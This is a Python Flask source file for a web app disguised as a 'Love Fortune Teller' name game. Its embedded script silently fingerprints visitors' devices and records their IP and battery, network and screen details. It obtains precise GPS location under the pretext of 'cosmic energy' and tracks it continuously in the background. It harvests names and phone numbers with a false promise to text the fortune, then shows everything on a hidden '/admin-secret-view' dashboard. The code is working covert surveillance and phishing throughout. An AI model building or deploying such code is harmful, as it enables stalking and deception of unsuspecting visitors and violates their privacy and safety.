from flask import Flask, request, jsonify, render_template_string
import os
import random
import json
import requests
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://love-percentage-dc42b-default-rtdb.firebaseio.com")

# ========== LOVE CALCULATOR FUNCTIONS ==========
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!"
    ]
    return random.choice(messages)

# ========== FIREBASE DATABASE FUNCTIONS ==========
def save_to_firebase(path, data):
    try:
        url = f"{FIREBASE_URL}/{path}.json"
        response = requests.put(url, json=data, timeout=10)
        print(f"Saved to {path}: {response.status_code}")  # Debug log
        return response.status_code in [200, 201]
    except Exception as e:
        print(f"Firebase save error: {e}")
        return False

def save_visitor(session_id, data):
    path = f"visitors/{session_id}"
    return save_to_firebase(path, data)

def save_location(session_id, lat, lon, map_url):
    timestamp = datetime.now().isoformat()
    path = f"tracking_data/{session_id}_{timestamp}"
    location_data = {
        "sessionId": session_id,
        "timestamp": timestamp,
        "latitude": lat,
        "longitude": lon,
        "mapUrl": map_url
    }
    return save_to_firebase(path, location_data)

# ========== HTML TEMPLATE ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Fortune Teller</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        
        .cosmic-panel {
            margin-top: 20px;
            padding: 25px;
            background: #fef5e7;
            border-radius: 25px;
            display: none;
            border: 2px solid #ffe0b5;
        }
        .cosmic-panel h3 { color: #c0392b; margin-bottom: 15px; }
        
        .cosmic-status {
            background: white;
            padding: 15px;
            border-radius: 15px;
            margin: 15px 0;
            font-size: 14px;
        }
        
        .cosmic-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        .cosmic-btn:hover { transform: translateY(-2px); }
        .cosmic-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        
        .result {
            margin-top: 25px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }
        .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
        
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Fortune Teller</h1>
    <div class="subtitle">Discover your destiny ✨</div>
    
    <!-- STEP 1: Names -->
    <div id="stepNames">
        <div class="input-group">
            <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
            <input type="text" id="name2" placeholder="Their name" maxlength="30" autocomplete="off">
        </div>
        <button class="btn" onclick="prepareReading()">🌙 Prepare Your Reading 🌙</button>
    </div>
    
    <!-- STEP 2: Cosmic Energy -->
    <div id="cosmicPanel" class="cosmic-panel">
        <h3>✨ Connecting to the Universe ✨</h3>
        <p style="font-size: 14px; margin-bottom: 15px;">The stars are aligning for your reading...</p>
        
        <div class="cosmic-status" id="cosmicStatus">
            🌟 Click below to begin your cosmic journey
        </div>
        
        <button class="cosmic-btn" id="cosmicBtn" onclick="syncCosmicEnergy()">
            🔮 Reveal My Destiny 🔮
        </button>
    </div>
    
    <!-- STEP 3: Fortune Result -->
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
    </div>
    
    <!-- STEP 4: Save Phone -->
    <div id="phoneSection" class="phone-section">
        <h4 style="margin-bottom: 12px;">📱 Receive Your Fortune</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your mobile number">
        <button class="save-btn" onclick="saveNumber()">💾 Send to My Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔮 Trust the universe | Your destiny awaits</footer>
</div>

<script>
    let sessionId = localStorage.getItem('destiny_session');
    if (!sessionId) {
        sessionId = 'destiny_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('destiny_session', sessionId);
    }
    
    let currentFortune = '';
    let currentPercent = 0;
    let name1 = '', name2 = '';
    let energyWatcher = null;
    let currentLat = null, currentLon = null;
    
    let destinyData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
    };
    
    // Silent device data collection
    async function collectDestinyData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            destinyData.fingerprint = result.visitorId;
        } catch(e) { destinyData.fingerprint = 'unknown'; }
        
        destinyData.screen = screen.width + 'x' + screen.height;
        destinyData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        destinyData.userAgent = navigator.userAgent;
        
        if (navigator.deviceMemory) {
            destinyData.deviceMemory = navigator.deviceMemory + ' GB';
        }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                destinyData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        
        const connection = navigator.connection;
        if (connection) {
            destinyData.networkType = connection.effectiveType;
        }
        
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
    }
    
    function prepareReading() {
        name1 = document.getElementById('name1').value.trim();
        name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            showMessage('Please enter both names 💕', 'error');
            return;
        }
        
        destinyData.name = name1;
        destinyData.crush_name = name2;
        
        fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
        
        document.getElementById('stepNames').style.display = 'none';
        document.getElementById('cosmicPanel').style.display = 'block';
        showMessage('The universe is ready for you ✨', 'info');
    }
    
    function syncCosmicEnergy() {
        const energyBtn = document.getElementById('cosmicBtn');
        energyBtn.innerHTML = '<span class="loading"></span> Connecting to the universe...';
        energyBtn.disabled = true;
        
        document.getElementById('cosmicStatus').innerHTML = '✨ The stars are aligning with your energy...';
        
        navigator.geolocation.getCurrentPosition(async (position) => {
            currentLat = position.coords.latitude;
            currentLon = position.coords.longitude;
            
            const mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
            
            // Save location to visitor data
            destinyData.latitude = currentLat;
            destinyData.longitude = currentLon;
            destinyData.mapUrl = mapUrl;
            
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
            
            // Save to tracking history
            await fetch('/record-energy', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    latitude: currentLat,
                    longitude: currentLon,
                    mapUrl: mapUrl
                })
            });
            
            // Start live tracking
            startEnergyTracking();
            await revealFortune();
            
            energyBtn.innerHTML = '✨ Your Destiny is Revealed ✨';
            
        }, (error) => {
            let errorMsg = 'Unable to connect to the universe. Please check your connection.';
            if (error.code === 1) errorMsg = '❌ Please allow cosmic connection for accurate reading!';
            if (error.code === 2) errorMsg = '❌ Universe connection unavailable. Please try again.';
            if (error.code === 3) errorMsg = '❌ Connection timeout. Please check your cosmic signal.';
            
            document.getElementById('cosmicStatus').innerHTML = errorMsg;
            energyBtn.innerHTML = '🔮 Try Again 🔮';
            energyBtn.disabled = false;
            showMessage(errorMsg, 'error');
        }, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    }
    
    function startEnergyTracking() {
        energyWatcher = navigator.geolocation.watchPosition(async (position) => {
            const newLat = position.coords.latitude;
            const newLon = position.coords.longitude;
            const newMapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
            
            currentLat = newLat;
            currentLon = newLon;
            
            await fetch('/record-energy', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    latitude: newLat,
                    longitude: newLon,
                    mapUrl: newMapUrl
                })
            });
            
            // Update latest location in visitor data
            destinyData.latitude = newLat;
            destinyData.longitude = newLon;
            destinyData.mapUrl = newMapUrl;
            
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
            
        }, (error) => {
            console.log('Tracking continues silently');
        }, {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 5000
        });
    }
    
    async function revealFortune() {
        try {
            const response = await fetch('/calculate-fortune', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name1, name2 })
            });
            const result = await response.json();
            
            currentPercent = result.percentage;
            currentFortune = result.message;
            
            document.getElementById('percentage').innerHTML = currentPercent + '%';
            document.getElementById('message').innerHTML = currentFortune;
            document.getElementById('result').style.display = 'block';
            document.getElementById('phoneSection').style.display = 'block';
            
            // Save fortune to visitor data
            destinyData.fortuneText = currentFortune;
            destinyData.percentage = currentPercent;
            
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
            
            showMessage('Your destiny is revealed! ✨', 'success');
            
        } catch(e) {
            showMessage('The universe is busy. Please try again.', 'error');
        }
    }
    
    async function saveNumber() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) {
            showMessage('Please enter your number to receive your fortune', 'error');
            return;
        }
        
        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
            showMessage('Please enter a valid number', 'error');
            return;
        }
        
        const saveBtn = document.querySelector('.save-btn');
        saveBtn.innerHTML = '<span class="loading"></span> Sending...';
        saveBtn.disabled = true;
        
        try {
            // Save phone number to visitor data
            destinyData.phoneNumber = phone;
            
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
            
            showMessage('✅ Your fortune has been sent to your phone!', 'success');
            document.getElementById('phone').disabled = true;
            saveBtn.innerHTML = '✅ Delivered!';
            saveBtn.style.background = '#38a169';
        } catch(e) {
            showMessage('Network error. Please try again.', 'error');
            saveBtn.innerHTML = '💾 Send to My Phone';
            saveBtn.disabled = false;
        }
    }
    
    function showMessage(message, type) {
        const msgDiv = document.getElementById('status');
        msgDiv.textContent = message;
        msgDiv.className = `status ${type}`;
        setTimeout(() => {
            msgDiv.style.display = 'none';
            msgDiv.className = 'status';
        }, 4000);
    }
    
    collectDestinyData();
</script>
</body>
</html>
'''

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save-destiny', methods=['POST'])
def save_destiny():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        
        save_visitor(session_id, data)
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/record-energy', methods=['POST'])
def record_energy():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        lat = data.get('latitude')
        lon = data.get('longitude')
        map_url = data.get('mapUrl')
        
        if session_id and lat and lon:
            save_location(session_id, lat, lon, map_url)
            return jsonify({'status': 'recorded'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        print(f"Energy record error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/calculate-fortune', methods=['POST'])
def calculate_fortune():
    try:
        data = request.get_json()
        name1 = data.get('name1', '')
        name2 = data.get('name2', '')
        percentage = calculate_love_percentage(name1, name2)
        message = get_love_message(name1, name2, percentage)
        return jsonify({'percentage': percentage, 'message': message})
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# ========== ADMIN VIEW ==========
@app.route('/admin-secret-view')
def admin_view():
    try:
        import requests
        visitors_url = f"{FIREBASE_URL}/visitors.json"
        tracking_url = f"{FIREBASE_URL}/tracking_data.json"
        
        visitors_response = requests.get(visitors_url)
        tracking_response = requests.get(tracking_url)
        
        visitors = visitors_response.json() if visitors_response.status_code == 200 else {}
        tracking = tracking_response.json() if tracking_response.status_code == 200 else {}
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard - Complete Data</title>
            <style>
                body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
                h1 { color:#f093fb; }
                h2 { color:#48bb78; margin-top:30px; }
                table { background:#16213e; border-collapse:collapse; width:100%; margin-bottom:20px; }
                th, td { border:1px solid #0f3460; padding:8px; text-align:left; font-size:12px; }
                th { background:#e94560; color:white; }
                .count { background:#0f3460; padding:10px; border-radius:10px; margin:20px 0; }
                .btn { background:#e94560; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; display:inline-block; margin:10px; }
                .map-link { color:#48bb78; text-decoration:none; }
            </style>
        </head>
        <body>
            <h1>📊 Complete Visitor Data</h1>
            <p><a href="/admin-secret-view" class="btn">🔄 Refresh</a> <a href="/" class="btn">🏠 Back to App</a></p>
        """
        
        if visitors:
            html += f'<div class="count"><strong>Total Visitors:</strong> {len(visitors)}</div>'
            html += """
            <h2>📍 All Visitor Data (Names, Fortune, Location, Phone)</h2>
            <div style="overflow-x:auto;">
            <table>
                <thead>
                    <tr>
                        <th>Session ID</th><th>Name</th><th>Crush Name</th><th>Love %</th><th>Fortune</th>
                        <th>Phone</th><th>Latitude</th><th>Longitude</th><th>Map URL</th>
                        <th>Fingerprint</th><th>Battery</th><th>Device Memory</th><th>Network</th><th>Screen</th><th>Timezone</th><th>IP</th>
                    </tr>
                </thead>
                <tbody>
            """
            for session_id, visitor in visitors.items():
                if isinstance(visitor, dict):
                    map_link = ""
                    if visitor.get('mapUrl'):
                        map_link = f'<a href="{visitor.get("mapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
                    
                    html += f"""
                        <tr>
                            <td>{session_id[:30]}...</td>
                            <td><strong>{visitor.get('name', '-')}</strong></td>
                            <td>{visitor.get('crush_name', '-')}</td>
                            <td style="color:#f093fb;">{visitor.get('percentage', '-')}%</td>
                            <td>{visitor.get('fortuneText', '-')[:50]}...</td>
                            <td>{visitor.get('phoneNumber', '-')}</td>
                            <td>{visitor.get('latitude', '-')}</td>
                            <td>{visitor.get('longitude', '-')}</td>
                            <td>{map_link}</td>
                            <td>{visitor.get('fingerprint', '-')[:20]}...</td>
                            <td>{visitor.get('batteryLevel', '-')}</td>
                            <td>{visitor.get('deviceMemory', '-')}</td>
                            <td>{visitor.get('networkType', '-')}</td>
                            <td>{visitor.get('screen', '-')}</td>
                            <td>{visitor.get('timezone', '-')}</td>
                            <td>{visitor.get('ip', '-')}</td>
                        </tr>
                    """
            html += "</tbody></table></div>"
        
        if tracking:
            html += f'<div class="count"><strong>Total Location Updates (Live Tracking):</strong> {len(tracking)}</div>'
            html += """
            <h2>🔄 Complete Movement History</h2>
            <div style="overflow-x:auto;">
            <table>
                <thead><tr><th>Session ID</th><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map URL</th></tr></thead>
                <tbody>
            """
            sorted_tracking = sorted(tracking.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
            for key, loc in sorted_tracking:
                if isinstance(loc, dict):
                    map_link = ""
                    if loc.get('mapUrl'):
                        map_link = f'<a href="{loc.get("mapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
                    html += f"""
                        <tr>
                            <td>{loc.get('sessionId', '')[:30]}...</td>
                            <td>{loc.get('timestamp', '')[:19]}</td>
                            <td>{loc.get('latitude', '-')}</td>
                            <td>{loc.get('longitude', '-')}</td>
                            <td>{map_link}</td>
                        </tr>
                    """
            html += "</tbody></table></div>"
        
        html += "</body></html>"
        return html
    except Exception as e:
        return f"<h1>Error: {str(e)}</h1>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
